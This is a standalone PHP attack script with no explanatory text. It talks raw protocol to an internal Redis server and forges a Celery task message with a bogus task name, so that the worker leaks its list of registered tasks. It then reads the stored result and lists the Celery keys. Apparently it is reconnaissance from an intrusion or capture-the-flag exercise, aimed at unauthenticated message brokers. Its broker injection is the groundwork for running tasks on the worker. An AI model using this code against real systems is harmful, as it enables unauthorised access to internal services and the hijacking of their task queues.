<?php
function redis_cmd($s, $cmd) {
    fwrite($s, $cmd . "\r\n");
    return trim(fgets($s));
}

$s = fsockopen("172.18.0.3", 6379);
echo redis_cmd($s, "PING") . "\n";

// Send task with invalid name → worker logs known tasks
$tid = "enum" . time();
$body = base64_encode(json_encode(array(array(), new stdClass, new stdClass)));
$msg = json_encode(array(
    "body" => $body,
    "content-encoding" => "utf-8",
    "content-type" => "application/json",
    "headers" => array("lang" => "py", "task" => "list_all_tasks_please", "id" => $tid, "root_id" => $tid),
    "properties" => array("correlation_id" => $tid, "reply_to" => $tid, "delivery_mode" => 2, "delivery_info" => array("exchange" => "", "routing_key" => "default"), "body_encoding" => "base64", "delivery_tag" => $tid)
));

$l = strlen($msg);
fwrite($s, "*3\r\n\$5\r\nLPUSH\r\n\$7\r\ndefault\r\n\$" . $l . "\r\n" . $msg . "\r\n");
echo "PUSH:" . redis_cmd($s, "") . "\n";

sleep(5);

// Check result — worker should store error with list of known tasks
fwrite($s, "GET celery-task-meta-" . $tid . "\r\n");
$rlen = trim(fgets($s));
echo "RLEN:" . $rlen . "\n";
if (substr($rlen, 0, 1) == '$' && $rlen != '$-1') {
    $vlen = intval(substr($rlen, 1));
    $data = fread($s, min($vlen, 1000) + 2);
    echo "DATA:" . $data . "\n";
}

// Also check all keys
fwrite($s, "KEYS celery*\r\n");
$kcount = trim(fgets($s));
echo "CELERY_KEYS:" . $kcount . "\n";
$n = intval(substr($kcount, 1));
for ($i = 0; $i < min($n, 10); $i++) {
    $kl = trim(fgets($s));
    echo "  K:" . trim(fgets($s, intval(substr($kl, 1)) + 3)) . "\n";
}

fclose($s);
